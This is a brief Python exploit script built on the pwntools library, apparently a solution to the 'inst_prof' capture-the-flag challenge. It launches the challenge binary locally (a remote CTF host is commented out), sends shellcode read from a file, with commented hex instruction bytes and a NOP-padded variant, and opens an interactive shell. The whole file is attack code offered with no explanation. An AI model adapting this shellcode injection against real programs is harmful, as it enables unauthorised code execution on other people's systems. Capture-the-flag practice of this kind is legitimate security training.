#!/usr/bin/env python
from pwn import *
import binascii

#print pwnlib.shellcraft.amd64.linux.sh()
#exit(0)
#s = remote("inst-prof.ctfcompetition.com", 1337)
s = process("./inst_prof")
#s = gdb.debug("./inst_prof_no_alarm")
sc = open("a.out").read()

#s.send(binascii.unhexlify(b"4c8b3c24"))
#s.send(binascii.unhexlify(b"4d8d77a2"))
#s.send(binascii.unhexlify(b"41ffd690"))

#sc = (b"\x90"*9) + bytes(open("a.out").read()).ljust(0x1000-9, "\x90")

s.send(sc)
s.interactive()
